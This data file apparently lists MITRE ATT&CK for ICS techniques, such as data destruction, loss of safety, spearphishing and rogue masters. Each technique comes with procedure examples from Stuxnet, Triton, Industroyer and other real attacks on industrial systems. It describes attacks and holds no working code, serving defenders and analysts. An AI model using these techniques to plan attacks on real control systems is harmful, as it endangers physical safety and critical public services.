T0809,Data Destruction,"Adversaries may perform data destruction over the course of an operation. The adversary may drop or create malware, tools, or other non-native files on a target system to accomplish this, potentially leaving behind traces of malicious activities. Such non-native files and other data may be removed over the course of an intrusion to maintain a small footprint or as a standard part of the post-intrusion cleanup process.   Data destruction may also be used to render operator interfaces unable to respond and to disrupt response functions from occurring as expected. An adversary may also destroy data backups that are vital to recovery after an incident.  Standard file deletion commands are available on most operating system and device interfaces to perform cleanup, but adversaries may use other tools as well. Two examples are Windows Sysinternals SDelete and Active@ Killdisk.","['[Industroyer] has a destructive wiper that overwrites all ICS configuration files across the hard drives and all mapped network drives specifically targeting ABB PCM600 configuration files. ', '[KillDisk] is able to delete system files to make the system unbootable and targets 35 different types of files for deletion. ', '[INCONTROLLER] can wipe the memory of Omron PLCs and reset settings through the remote HTTP service. ']",False
T0832,Manipulation of View,"Adversaries may attempt to manipulate the information reported back to operators or controllers. This manipulation may be short term or sustained. During this time the process itself could be in a much different state than what is reported.      Operators may be fooled into doing something that is harmful to the system in a loss of view situation. With a manipulated view into the systems, operators may issue inappropriate control sequences that introduce faults or catastrophic failures into the system. Business analysis systems can also be provided with inaccurate data leading to bad management decisions.","['[Industroyer] OPC module can brute force values and will send out a 0x01 status which for the target systems equates to a Primary Variable Out of Limits misdirecting operators from understanding protective relay status. ', '[Stuxnet] manipulates the view of operators replaying process input and manipulating the I/O image to evade detection and inhibit protection functions.  ']",False
T0810,Data Historian Compromise,"Adversaries may compromise and gain control of a data historian to gain a foothold into the control system environment. Access to a data historian may be used to learn stored database archival and analysis information on the control system. A dual-homed data historian may provide adversaries an interface from the IT environment to the OT environment.   Dragos has released an updated analysis on CrashOverride that outlines the attack from the ICS network breach to payload delivery and execution.   The report summarized that CrashOverride represents a new application of malware, but relied on standard intrusion techniques. In particular, new artifacts include references to a Microsoft Windows Server 2003 host, with a SQL Server. Within the ICS environment, such a database server can act as a data historian. Dragos noted a device with this role should be ""expected to have extensive connections"" within the ICS environment. Adversary activity leveraged database capabilities to perform reconnaissance, including directory queries and network connectivity checks.  Permissions Required: Administrator  Contributors: Joe Slowik - Dragos","['In [Industroyer] after pivoting into the ICS environment, the adversary gained [Initial Access] to devices involved with critical process operations through a Microsoft Windows Server 2003 running a SQL Server.']",
T0841,Network Service Scanning,"Network Service Scanning is the process of discovering services on networked systems.  This can be achieved through a technique called port scanning or probing.  Port scanning interacts with the TCP/IP ports on a target system to determine whether ports are open, closed, or filtered by a firewall.  This does not reveal the service that is running behind the port, but since many common services are run on [https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml specific port numbers], the type of service can be assumed.  More in-depth testing includes interaction with the actual service to determine the service type and specific version.  One of the most-popular tools to use for Network Service Scanning is [https://nmap.org/ Nmap].  An adversary may attempt to gain information about a target device and its role on the network via Network Service Scanning techniques, such as port scanning.  Network Service Scanning is useful for determining potential vulnerabilities in services on target devices.  Network Service Scanning is closely tied to .  Scanning ports can be noisy on a network. In some attacks, adversaries probe for specific ports using custom tools. This was specifically seen in the Triton and PLC-Blaster attacks.",[],
T0872,Indicator Removal on Host,"Adversaries may attempt to remove indicators of their presence on a system in an effort to cover their tracks. In cases where an adversary may feel detection is imminent, they may try to overwrite, delete, or cover up changes they have made to the device.","['[Triton] would reset the controller to the previous state over TriStation and if this failed it would write a dummy program to memory in what was likely an attempt at anti-forensics. ', '[KillDisk] deletes application, security, setup, and system event logs from Windows systems. ', '[Dragonfly 2.0] deleted indicators on staging and target devices by uninstalling software, removing event logs, batch scripts, screenshots, registry keys, documents, and tools they brought into the target networks. ']",
T0877,I/O Image,"Adversaries may seek to capture process values related to the inputs and outputs of a PLC. During the scan cycle, a PLC reads the status of all inputs and stores them in an image table.  The image table is the PLCs internal storage location where values of inputs/outputs for one scan are stored while it executes the user program. After the PLC has solved the entire logic program, it updates the output image table. The contents of this output image table are written to the corresponding output points in I/O Modules.  The Input and Output Image tables described above make up the I/O Image on a PLC. This image is used by the user program instead of directly interacting with physical I/O.    Adversaries may collect the I/O Image state of a PLC by utilizing a devices [Native API] to access the memory regions directly. The collection of the PLCs I/O state could be used to replace values or inform future stages of an attack.","['[Stuxnet] copies the input area of an I/O image into data blocks with a one second interval between copies, forming a 21 second recording of the input area. The input area contains information being passed to the PLC from a peripheral. For example, the current state of a valve or the temperature of a device. ']",False
T0815,Denial of View,"Adversaries may cause a denial of view in attempt to disrupt and prevent operator oversight on the status of an ICS environment. This may manifest itself as a temporary communication failure between a device and its control source, where the interface recovers and becomes available once the interference ceases.      An adversary may attempt to deny operator visibility by preventing them from receiving status and reporting messages. Denying this view may temporarily block and prevent operators from noticing a change in state or anomalous behavior. The environment's data and processes may still be operational, but functioning in an unintended or adversarial manner. ","['[Industroyer] is able to block serial COM channels temporarily causing a denial of view. ', 'In the [Maroochy Water Breach] the adversary temporarily shut an investigator out of the network, preventing them from viewing the state of the system.']",False
T0871,Execution through API,Adversaries may attempt to leverage Application Program Interfaces (APIs) used for communication between control software and the hardware. Specific functionality is often coded into APIs which can be called by software to engage specific functions on a device or other software.,"['[Triton] leverages a reconstructed TriStation protocol within its framework to trigger APIs related to program download, program allocation, and program changes. ', '[PLC-Blaster] utilizes the PLC communication and management API to load executable Program Organization Units.']",False
T0862,Supply Chain Compromise,"Adversaries may perform supply chain compromise to gain control systems environment access by means of infected products, software, and workflows. Supply chain compromise is the manipulation of products, such as devices or software, or their delivery mechanisms before receipt by the end consumer. Adversary compromise of these products and mechanisms is done for the goal of data or system compromise, once infected products are introduced to the target environment.   Supply chain compromise can occur at all stages of the supply chain, from manipulation of development tools and environments to manipulation of developed products and tools distribution mechanisms. This may involve the compromise and replacement of legitimate software and patches, such as on third party or vendor websites. Targeting of supply chain compromise can be done in attempts to infiltrate the environments of a specific audience. In control systems environments with assets in both the IT and OT networks, it is possible a supply chain compromise affecting the IT environment could enable further access to the OT environment.     Counterfeit devices may be introduced to the global supply chain posing safety and cyber risks to asset owners and operators. These devices may not meet the safety, engineering and manufacturing requirements of regulatory bodies but may feature tagging indicating conformance with industry standards. Due to the lack of adherence to standards and overall lesser quality, the counterfeit products may pose a serious safety and operational risk.    Yokogawa identified instances in which their customers received counterfeit differential pressure transmitters using the Yokogawa logo. The counterfeit transmitters were nearly indistinguishable with a semblance of functionality and interface that mimics the genuine product.    F-Secure Labs analyzed the approach the adversary used to compromise victim systems with Havex.  The adversary planted trojanized software installers available on legitimate ICS/SCADA vendor websites. After being downloaded, this software infected the host computer with a Remote Access Trojan (RAT).","['The [Backdoor.Oldrea] RAT is distributed through trojanized installers planted on compromised vendor sites. ', '[TEMP.Veles] targeted several ICS vendors and manufacturers. ', '[Dragonfly] trojanized legitimate ICS equipment providers software packages available for download on their websites.', '[Dragonfly 2.0] trojanized legitimate software to deliver malware disguised as standard windows applications. ']",False
T0854,Serial Connection Enumeration,"Adversaries may perform serial connection enumeration to gather situational awareness after gaining access to devices in the OT network. Control systems devices often communicate to each other via various types of serial communication mediums. These serial communications are used to facilitate informational communication, as well as commands.  Serial Connection Enumeration differs from I/O Module Discovery, as I/O modules are auxiliary systems to the main system, and devices that are connected via serial connection are normally discrete systems.  While IT and OT networks may work in tandem, the exact structure of the OT network may not be discernible from the IT network alone. After gaining access to a device on the OT network, an adversary may be able to enumerate the serial connections. From this perspective, the adversary can see the specific physical devices to which the compromised device is connected to. This gives the adversary greater situational awareness and can influence the actions that the adversary can take in an attack.","['[Industroyer] contains modules for IEC 101 and IEC 104 communications. IEC 101 uses serial for the physical connection and IEC 104 uses Ethernet. Analysis of the malware by Dragos states that both of the modules have equivalent functionality. The IEC 104 module uses Network Connection Enumeration to determine the Ethernet adapters on the device. Since functionality between the two modules are equivalent, this implies that the IEC 101 module is able to detect serial interfaces on the device.']",
T0880,Loss of Safety,Adversaries may compromise safety system functions designed to maintain safe operation of a process when unacceptable or dangerous conditions occur. Safety systems are often composed of the same elements as control systems but have the sole purpose of ensuring the process fails in a predetermined safe manner.   Many unsafe conditions in process control happen too quickly for a human operator to react to. Speed is critical in correcting these conditions to limit serious impacts such as Loss of Control and Property Damage.   Adversaries may target and disable safety system functions as a prerequisite to subsequent attack execution or to allow for future unsafe conditionals to go unchecked. Detection of a Loss of Safety by operators can result in the shutdown of a process due to strict policies regarding safety systems. This can cause a Loss of Productivity and Revenue and may meet the technical goals of adversaries seeking to cause process disruptions.,"['[Triton] has the capability to reprogram the SIS logic to allow unsafe conditions to persist or reprogram the SIS to allow an unsafe state  while using the DCS to create an unsafe state or hazard. ', '[Industroyer] a module which leveraged a vulnerability in the Siemens SIPROTEC relays (CVE-2015-5374) to create a Denial of Service against automated protective relays.']",False
T0828,Loss of Productivity and Revenue,"Adversaries may cause loss of productivity and revenue through disruption and even damage to the availability and integrity of control system operations, devices, and related processes. This technique may manifest as a direct effect of an ICS-targeting attack or tangentially, due to an IT-targeting attack against non-segregated environments.   In cases where these operations or services are brought to a halt, the loss of productivity may eventually present an impact for the end-users or consumers of products and services. The disrupted supply-chain may result in supply shortages and increased prices, among other consequences.   A ransomware attack on an Australian beverage company resulted in the shutdown of some manufacturing sites, including precautionary halts to protect key systems.  The company announced the potential for temporary shortages of their products following the attack.     In the 2021 Colonial Pipeline ransomware incident, the pipeline was unable to transport approximately 2.5 million barrels of fuel per day to the East Coast.  ","['An enterprise resource planning (ERP) manufacturing server was lost to the [Ryuk] attack. The manufacturing process had to rely on paper and existing orders to keep the shop floor open. ', 'During the [2015 Ukraine Electric Power Attack] power breakers were opened which caused the operating companies to be unable to deliver power, and left thousands of businesses and households without power for around 6 hours. ', 'While Norsk Hydro attempted to recover from a [LockerGoga] infection, most of its 160 manufacturing locations switched to manual (non-IT driven) operations. Manual operations can result in a loss of productivity. ', 'A [Conficker] infection at a nuclear power plant forced the facility to shutdown and go through security procedures involved with such events, with its staff scanning computer systems and going through all the regular checks and motions before putting the plant back into production. ', '[NotPetya] disrupted manufacturing facilities supplying vaccines, resulting in a halt of production and the inability to meet demand for specific vaccines. ', '[EKANS] infection resulted in a temporary production loss within a Honda manufacturing plant. ', 'The [REvil] malware gained access to an organizations network and encrypted sensitive files used by OT equipment. ', 'Several transportation organizations in Ukraine have suffered from being infected by [Bad Rabbit] resulting in some computers becoming encrypted, according to media reports. ']",False
T0865,Spearphishing Attachment,"Adversaries may use a spearphishing attachment, a variant of spearphishing, as a form of a social engineering attack against specific targets. Spearphishing attachments are different from other forms of spearphishing in that they employ malware attached to an email. All forms of spearphishing are electronically delivered and target a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution] to gain execution and access.    A Chinese spearphishing campaign running from December 9, 2011 through February 29, 2012, targeted ONG organizations and their employees. The emails were constructed with a high level of sophistication to convince employees to open the malicious file attachments. ","['[APT33] sent spear phishing emails containing links to HTML application files, which were embedded with malicious code.  [APT33] has conducted targeted spear phishing campaigns against U.S. government agencies and private sector companies. ', '[Lazarus Group] has been observed targeting organizations using spearphishing documents with embedded malicious payloads.  Highly targeted spear phishing campaigns have been conducted against a U.S. electric grid company. ', '[OilRig] used spearphishing emails with malicious Microsoft Excel spreadsheet attachments. ', '[ALLANITE] utilized spear phishing to gain access into energy sector environments. ', '[BlackEnergy] targeted energy sector organizations in a wide reaching email spearphishing campaign. Adversaries utilized malicious Microsoft Word documents attachments.  ', 'The [Backdoor.Oldrea] RAT is distributed through a trojanized installer attached to emails. ', 'In the Ukraine 2015 incident, [Sandworm Team] sent spearphishing attachments to three energy distribution companies containing malware to gain access to victim systems. ', '[Dragonfly 2.0] used the Phishery tool kit to conduct spear phishing attacks and gather credentials.   [Dragonfly 2.0] conducted a targeted spear phishing campaign against multiple electric utilities in the North America.   ', '[HEXANE] has used malicious documents to drop malware and gain access into an environment. ']",False
T0825,Location Identification,"Adversaries may perform location identification using device data to inform operations and targeted impact for attacks. Location identification data can come in a number of forms, including geographic location, location relative to other control system devices, time zone, and current time. An adversary may use an embedded global positioning system (GPS) module in a device to figure out the physical coordinates of a device. NIST SP800-82 recommends that devices utilize GPS or another location determining mechanism to attach appropriate timestamps to log entries . While this assists in logging and event tracking, an adversary could use the underlying positioning mechanism to determine the general location of a device. An adversary can also infer the physical location of serially connected devices by using serial connection enumeration.   An adversary attempt to attack and cause Impact could potentially affect other control system devices in close proximity. Device local-time and time-zone settings can also provide adversaries a rough indicator of device location, when specific geographic identifiers cannot be determined from the system.","['The [Backdoor.Oldrea] payload has the capability of enumerating OPC tags, in addition to more generic OPC server information. The tag names, depending on the naming convention, can provide information about facilities and locations.)']",
T0817,Drive-by Compromise,"Adversaries may gain access to a system during a drive-by compromise, when a user visits a website as part of a regular browsing session. With this technique, the user's web browser is targeted and exploited simply by visiting the compromised website.   The adversary may target a specific community, such as trusted third party suppliers or other industry specific groups, which often visit the target website. This kind of targeted attack relies on a common interest, and is known as a strategic web compromise or watering hole attack.   The National Cyber Awareness System (NCAS) has issued a Technical Alert (TA) regarding Russian government cyber activity targeting critical infrastructure sectors.  Analysis by DHS and FBI has noted two distinct categories of victims in the Dragonfly campaign on the Western energy sector: staging and intended targets. The adversary targeted the less secure networks of staging targets, including trusted third-party suppliers and related peripheral organizations. Initial access to the intended targets used watering hole attacks to target process control, ICS, and critical infrastructure related trade publications and informational websites.","['[Dragonfly] utilized watering hole attacks on energy sector websites by injecting a redirect iframe to deliver [Backdoor.Oldrea] or [Trojan.Karagany] ', '[Bad Rabbit] ransomware spreads through drive-by attacks where insecure websites are compromised. While the target is visiting a legitimate website, a malware dropper is being downloaded from the threat actors infrastructure. ', '[TEMP.Veles] utilizes watering hole websites to target industrial employees. ', '[OilRig] has been seen utilizing watering hole attacks to collect credentials which could be used to gain access into ICS networks. ', '[ALLANITE] leverages watering hole attacks to gain access into electric utilities. ', '[Dragonfly 2.0] utilized watering hole attacks to gather credentials, by compromising websites that energy sector organizations might access.  A line of code is injected into the header.php file, this is used to redirect the visitors to an adversary controlled IP. ']",False
T0879,Damage to Property,"Adversaries may cause damage and destruction of property to infrastructure, equipment, and the surrounding environment when attacking control systems. This technique may result in device and operational equipment breakdown, or represent tangential damage from other techniques used in an attack. Depending on the severity of physical damage and disruption caused to control processes and systems, this technique may result in [Loss of Safety] Operations that result in [Loss of Control] may also cause damage to property, which may be directly or indirectly motivated by an adversary seeking to cause impact in the form of [Loss of Productivity and Revenue]    The German Federal Office for Information Security (BSI) reported a targeted attack on a steel mill under an incidents affecting business section of its 2014 IT Security Report.   These targeted attacks affected industrial operations and resulted in breakdowns of control system components and even entire installations. As a result of these breakdowns, massive impact and damage resulted from the uncontrolled shutdown of a blast furnace.   A Polish student used a remote controller device to interface with the Lodz city tram system in Poland.    Using this remote, the student was able to capture and replay legitimate tram signals. This resulted in damage to impacted trams, people, and the surrounding property. Reportedly, four trams were derailed and were forced to make emergency stops.  Commands issued by the student may have also resulted in tram collisions, causing harm to those on board and the environment outside. ","[""In the [Maroochy Water Breach] the adversary gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way. This ultimately led to 800,000 liters of raw sewage being spilled out into the community. The raw sewage affected local parks, rivers, and even a local hotel. This resulted in harm to marine life and produced a sickening stench from the community's affected rivers.""]",False
T0856,Spoof Reporting Message,"Adversaries may spoof reporting messages in control system environments for evasion and to impair process control. In control systems, reporting messages contain telemetry data (e.g., I/O values) pertaining to the current state of equipment and the industrial process. Reporting messages are important for monitoring the normal operation of a system or identifying important events such as deviations from expected values.   If an adversary has the ability to Spoof Reporting Messages, they can impact the control system in many ways. The adversary can Spoof Reporting Messages that state that the process is operating normally, as a form of evasion. The adversary could also Spoof Reporting Messages to make the defenders and operators think that other errors are occurring in order to distract them from the actual source of a problem.  ",['In the [Maroochy Water Breach] the adversary used a dedicated analog two-way radio system to send false data and instructions to pumping stations and the central computer.'],False
T0866,Exploitation of Remote Services,"Adversaries may exploit a software vulnerability to take advantage of a programming error in a program, service, or within the operating system software or kernel itself to enable remote service abuse. A common goal for post-compromise exploitation of remote services is for initial access into and lateral movement throughout the ICS environment to enable access to targeted systems.   ICS asset owners and operators have been affected by ransomware (or disruptive malware masquerading as ransomware) migrating from enterprise IT to ICS environments: WannaCry, NotPetya, and BadRabbit. In each of these cases, self-propagating (wormable) malware initially infected IT networks, but through exploit (particularly the SMBv1-targeting MS17-010 vulnerability) spread to industrial networks, producing significant impacts. ","['[Bad Rabbit] initially infected IT networks, but by means of an exploit (particularly the SMBv1-targeting MS17-010 vulnerability) spread to industrial networks. ', '[NotPetya] initially infected IT networks, but by means of an exploit (particularly the SMBv1-targeting MS17-010 vulnerability) spread to industrial networks. ', '[Stuxnet] executes malicious SQL commands in the WinCC database server to propagate to remote systems. The malicious SQL commands include xp_cmdshell, sp_dumpdbilog, and sp_addextendedproc. ', '[WannaCry] initially infected IT networks, but by means of an exploit (particularly the SMBv1-targeting MS17-010 vulnerability) spread to industrial networks. ']",False
T0812,Default Credentials,"Adversaries may leverage manufacturer or supplier set default credentials on control system devices. These default credentials may have administrative permissions and may be necessary for initial configuration of the device. It is general best practice to change the passwords for these accounts as soon as possible, but some manufacturers may have devices that have passwords or usernames that cannot be changed.   Default credentials are normally documented in an instruction manual that is either packaged with the device, published online through official means, or published online through unofficial means. Adversaries may leverage default credentials that have not been properly modified or disabled.",[],False
T0822,External Remote Services,"Adversaries may leverage external remote services as a point of initial access into your network. These services allow users to connect to internal network resources from external locations. Examples are VPNs, Citrix, and other access mechanisms. Remote service gateways often manage connections and credential authentication for these services.   External remote services allow administration of a control system from outside the system. Often, vendors and internal engineering groups have access to external remote services to control system networks via the corporate network. In some cases, this access is enabled directly from the internet. While remote access enables ease of maintenance when a control system is in a remote area, compromise of remote access solutions is a liability. The adversary may use these services to gain access to and execute attacks against a control system network. Access to valid accounts is often a requirement.   As they look for an entry point into the control system network, adversaries may begin searching for existing point-to-point VPN implementations at trusted third party networks or through remote support employee connections where split tunneling is enabled.  ","['During the [2015 Ukraine Electric Power Attack] [Sandworm Team] used Valid Accounts taken from the Windows Domain Controller to access the control system Virtual Private Network (VPN) used by grid operators. ', 'In the [Maroochy Water Breach] the adversary gained remote computer access to the system over radio.', 'In the Ukraine 2015 Incident, [Sandworm Team] harvested VPN worker credentials and used them to remotely log into control system networks.    ', '[NotPetya] can utilize exposed SMB services to access industrial networks.', '[WannaCry] can utilize exposed SMB services to access industrial networks.', '[XENOTIME] utilized remote desktop protocol (RDP) jump boxes to move into the ICS environment.', '[Bad Rabbit] can utilize exposed SMB services to access industrial networks.']",False
T0806,Brute Force I/O,"Adversaries may repetitively or successively change I/O point values to perform an action. Brute Force I/O may be achieved by changing either a range of I/O point values or a single point value repeatedly to manipulate a process function. The adversary's goal and the information they have about the target environment will influence which of the options they choose. In the case of brute forcing a range of point values, the adversary may be able to achieve an impact without targeting a specific point. In the case where a single point is targeted, the adversary may be able to generate instability on the process function associated with that particular point.   Adversaries may use Brute Force I/O to cause failures within various industrial processes. These failures could be the result of wear on equipment or damage to downstream equipment.","['[Industroyer2] can iterate across a device’s IOAs to modify the ON/OFF value of a given IO state.', 'The [Industroyer] IEC 104 module has 3 modes available to perform its attack. These modes are range, shift, and sequence. The range mode operates in 2 stages. The first stage of range mode gathers Information Object Addresses (IOA) and sends select and execute packets to switch the state. The second stage of range mode has an infinite loop where it will switch the state of all of the previously discovered IOAs. Shift mode is similar to range mode, but instead of staying within the same range, it will add a shift value to the default range values. ']",False
T0870,Detect Program State,"Adversaries may seek to gather information about the current state of a program on a PLC. State information reveals information about the program, including whether it's running, halted, stopped, or has generated an exception. This information may be leveraged as a verification of malicious program execution or to determine if a PLC is ready to download a new program.",['[Triton] contains a file named TS_cnames.py which contains default definitions for program state (TS_progstate). Program state is referenced in TsHi.py.'],
T0830,Adversary-in-the-Middle,"Adversaries with privileged network access may seek to modify network traffic in real time using adversary-in-the-middle (AiTM) attacks.  This type of attack allows the adversary to intercept traffic to and/or from a particular device on the network. If a AiTM attack is established, then the adversary has the ability to block, log, modify, or inject traffic into the communication stream. There are several ways to accomplish this attack, but some of the most-common are Address Resolution Protocol (ARP) poisoning and the use of a proxy.     An AiTM attack may allow an adversary to perform the following attacks:   [Block Reporting Message] [Spoof Reporting Message] [Modify Parameter] [Unauthorized Command Message]","[""The [VPNFilter] ssler module configures the device's iptables to redirect all traffic destined for port 80 to its local service listening on port 8888. Any outgoing web requests on port 80 are now intercepted by ssler and can be inspected by the ps module and manipulated before being sent to the legitimate HTTP service.  "", ""The [VPNFilter] ssler module configures the device's iptables to redirect all traffic destined for port 80 to its local service listening on port 8888. Any outgoing web requests on port 80 are now intercepted by ssler and can be inspected by the ps module and manipulated before being sent to the legitimate HTTP service.  "", '[Stuxnet] de-couples all inputs and signals from the legitimate code on a PLC and chooses what is passed to the original code. STUXNET effectively creates a man in the middle attack with the input and output signals and control logic.', '[HEXANE] targeted telecommunication providers in the greater Middle East, Central Asia, and Africa, potentially as a stepping stone to network-focused man-in-the-middle and related attacks.']",False
T0820,Exploitation for Evasion,"Adversaries may exploit a software vulnerability to take advantage of a programming error in a program, service, or within the operating system software or kernel itself to evade detection. Vulnerabilities may exist in software that can be used to disable or circumvent security features.    Adversaries may have prior knowledge through [Remote System Information Discovery] about security features implemented on control devices. These device security features will likely be targeted directly for exploitation. There are examples of firmware RAM/ROM consistency checks on control devices being targeted by adversaries to enable the installation of malicious [System Firmware]","['[Triton] disables a firmware RAM/ROM consistency check after injects a payload (imain.bin) into the firmware memory region.    Triconex systems include continuous means of detection including checksums for firmware and program integrity, memory and memory reference integrity, and configuration. ']",False
T0827,Loss of Control,"Adversaries may seek to achieve a sustained loss of control or a runaway condition in which operators cannot issue any commands even if the malicious interference has subsided.     The German Federal Office for Information Security (BSI) reported a targeted attack on a steel mill in its 2014 IT Security Report. These targeted attacks affected industrial operations and resulted in breakdowns of control system components and even entire installations. As a result of these breakdowns, massive impact resulted in damage and unsafe conditions from the uncontrolled shutdown of a blast furnace.","['[Industroyer] data wiper component removes the registry image path throughout the system and overwrites all files, rendering the system unusable. ', ""Some of Norsk Hydro's production systems were impacted by a [LockerGoga] infection. This resulted in a loss of control which forced the company to switch to manual operations.  "", 'During the [2015 Ukraine Electric Power Attack] operators were shut out of their equipment either through the denial of peripheral use or the degradation of equipment. Operators were therefore unable to recover from the incident through their traditional means. Much of the power was restored manually. ']",False
T0875,Change Program State,Adversaries may attempt to change the state of the current program on a control device. Program state changes may be used to allow for another program to take over control or be loaded onto the device.,"['After [PLC-Blaster] is transferred to a PLC, the PLC begins execution of PLC-Blaster.', '[Triton] has the ability to halt or run a program through the TriStation protocol. TsHi.py contains instances of halt and run functions being executed.', '[Stuxnet] halts the original PLC code and the malicious PLC code begins sending frames of data based on the recorded values during the DP_RECV monitor phase.']",
T0874,Hooking,"Adversaries may hook into application programming interface (API) functions used by processes to redirect calls for execution and privilege escalation means. Windows processes often leverage these API functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions.   One type of hooking seen in ICS involves redirecting calls to these functions via import address table (IAT) hooking. IAT hooking uses modifications to a process IAT, where pointers to imported API functions are stored. ","['[Stuxnet] modifies the Import Address Tables DLLs to hook specific APIs that are used to open project files. ', ""[Triton] injector, inject.bin, changes the function pointer of the 'get main processor diagnostic data' TriStation command to the address of imain.bin so that it is executed prior to the normal handler. "", 'In states 3 and 4 [Stuxnet] sends two network bursts (done through the DP_SEND primitive). The data in the frames are instructions for the frequency converter drives.']",False
T0808,Control Device Identification,"Adversaries may perform control device identification to determine the make and model of a target device. Management software and device APIs may be utilized by the adversary to gain this information. By identifying and obtaining device specifics, the adversary may be able to determine device vulnerabilities. This device information can also be used to understand device functionality and inform the decision to target the environment.","[""[Industroyer] contains an OPC DA module that enumerates all OPC servers using the ICatInformation::EnumClassesOfCategories method with CATID_OPCDAServer20 category identifier and IOPCServer::GetStatus to identify the ones running. The OPC DA module also uses IOPCBrowseServerAddressSpace to look for items with the following strings: 'ctlSelOn', 'ctlOperOn', 'ctlSelOff', ctlOperOff', 'Pos and stVal'.  If the target device responds appropriately, the Industroyer IEC 61850 payload then sends an InitiateRequest packet using the Manufacturing Message Specification (MMS). If the expected answer is received, it continues, sending an MMS getNameList request. Thereby, the component compiles a list of object names in a Virtual Manufacturing Device."", 'The [Triton] Python script is also capable of autodetecting Triconex controllers on the network by sending a specific UDP broadcast packet over port 1502. Dec 2018)', 'The [PLC-Blaster] worm starts by scanning for probable targets. Siemens SIMATIC PLCs may be identified by the port 102/tcp.', ""The [VPNFilter] packet sniffer monitors ICS traffic, and is specific to the TP-LINK R600-VPN. The malware uses a raw socket to look for connections to a pre-specified IP address, only looking at TCP packets that are 150 bytes or larger. 'ps' identifies and logs on IPs and ports, but not the packet contents on port 502 (Modbus traffic). It does not validate the traffic as Modbus."", 'The Siemens s7otbxdx.dll is responsible for handling PLC block exchange between the programming device (i.e., a computer running a Simatic manager on Windows) and the PLC. s7db_open function is an export hook that is used to obtain information used to create handles to manage a PLC (such a handle is used by APIs that manipulate the PLC). [Stuxnet] utilized this export hook to gain information about targeted PLCs such as model information.[Stuxnet] was specifically targeting CPUs 6ES7-315-2 (Series 300) with special system data block characteristics for sequence A or B and 6ES7-315-2 for sequence C. The PLC type can also be checked using the s7ag_read_szl API.', 'The [Backdoor.Oldrea] payload gathers server information that includes CLSID, server name, Program ID, OPC version, vendor information, running state, group count, and server bandwidth. This information helps indicate the role the server has in the control process.)']",
T0844,Program Organization Units,"Program Organizational Units (POUs) are block structures used within PLC programming to create programs and projects.  POUs can be used to hold user programs written in IEC 61131-3 languages: Structured text, Instruction list, Function block, and Ladder logic.  Application - 201203 They can also provide additional functionality, such as establishing connections between the PLC and other devices using TCON.     Stuxnet uses a simple code-prepending infection technique to infect Organization Blocks (OB). For example, the following sequence of actions is performed when OB1 is infected  : *Increase the size of the original block. *Write malicious code to the beginning of the block. *Insert the original OB1 code after the malicious code.","['[Stuxnet] infects PLCs with different code depending on the characteristics of the target system. An infection sequence consists of code blocks and data blocks that will be downloaded to the PLC to alter its behavior.', '[PLC-Blaster] copies itself to various Program Organization Units (POU) on the target device. The POUs include the Organization Block, Data Block, Function, and Function Block.']",
T0823,Graphical User Interface,"Adversaries may attempt to gain access to a machine via a Graphical User Interface (GUI) to enhance execution capabilities. Access to a GUI allows a user to interact with a computer in a more visual manner than a CLI. A GUI allows users to move a cursor and click on interface objects, with a mouse and keyboard as the main input devices, as opposed to just using the keyboard.  If physical access is not an option, then access might be possible via protocols such as VNC on Linux-based and Unix-based operating systems, and RDP on Windows operating systems. An adversary can use this access to execute programs and applications on the target machine.","['During the [2015 Ukraine Electric Power Attack] [Sandworm Team] utilized HMI GUIs in the SCADA environment to open breakers. ', 'During the [Oldsmar Treatment Plant Intrusion] the threat actors utilized the operator HMI interface through the graphical user interface. This action led to immediate operator detection as they were able to see the adversary making changes on their screen.', 'In the Ukraine 2015 Incident, [Sandworm Team] utilized HMI GUIs in the SCADA environment to open breakers. ']",False
T0848,Rogue Master,"Adversaries may setup a rogue master to leverage control server functions to communicate with outstations. A rogue master can be used to send legitimate control messages to other control system devices, affecting processes in unintended ways. It may also be used to disrupt network communications by capturing and receiving the network traffic meant for the actual master. Impersonating a master may also allow an adversary to avoid detection.   In the case of the 2017 Dallas Siren incident, adversaries used a rogue master to send command messages to the 156 distributed sirens across the city, either through a single rogue transmitter with a strong signal, or using many distributed repeaters.  ",['In the [Maroochy Water Breach] the adversary falsified network addresses in order to send false data and instructions to pumping stations.'],False
T0834,Native API,"Adversaries may directly interact with the native OS application programming interface (API) to access system functions. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.  These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.   Functionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as memcpy and direct operations on memory registers can be used to modify user and system memory space.","['[Triton] imain.bin payload takes commands from the TsHi.ExplReadRam(Ex), TsHi.ExplWriteRam(Ex) and TsHi.ExplExec functions to perform operations on controller memory and registers using syscalls written in PowerPC shellcode. ', '[PLC-Blaster] uses the system function blocks TCON and TDISCON to initiate and destroy TCP connections to arbitrary systems. Buffers may be sent and received on these connections with TRCV und TSEND system function blocks. ', '[Stuxnet] calls system function blocks which are part of the operating system running on the PLC. Theyre used to execute system tasks, such as reading the system clock (SFC1) and generating data blocks on the fly. ']",False
T0826,Loss of Availability,"Adversaries may attempt to disrupt essential components or systems to prevent owner and operator from delivering products or services.      Adversaries may leverage malware to delete or encrypt critical data on HMIs, workstations, or databases.  In the 2021 Colonial Pipeline ransomware incident, pipeline operations were temporally halted on May 7th and were not fully restarted until May 12th. ","['A [Conficker] infection at a nuclear power plant forced the facility to temporarily shutdown. ', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] opened the breakers at the infected sites, shutting the power off for thousands of businesses and households for around 6 hours. ']",False
T0882,Theft of Operational Information,"Adversaries may steal operational information on a production environment as a direct mission outcome for personal gain or to inform future operations. This information may include design documents, schedules, rotational data, or similar artifacts that provide insight on operations.    In the Bowman Dam incident, adversaries probed systems for operational data.  ","['[ACAD/Medre.A] can collect AutoCad files with drawings. These drawings may contain operational information.  ', '[REvil] sends exfiltrated data from the victims system using HTTPS POST messages sent to the C2 system.  ', '[Duqu] purpose is to gather intelligence data and assets from entities such as industrial infrastructure and system manufacturers, amongst others not in the industrial sector, in order to more easily conduct a future attack against another third party.', '[Flame] can collect AutoCAD design data and visio diagrams as well as other documents that may contain operational information. ', '[Dragonfly 2.0] captured ICS vendor names, reference documents, wiring diagrams, and panel layouts about the process environment. ']",
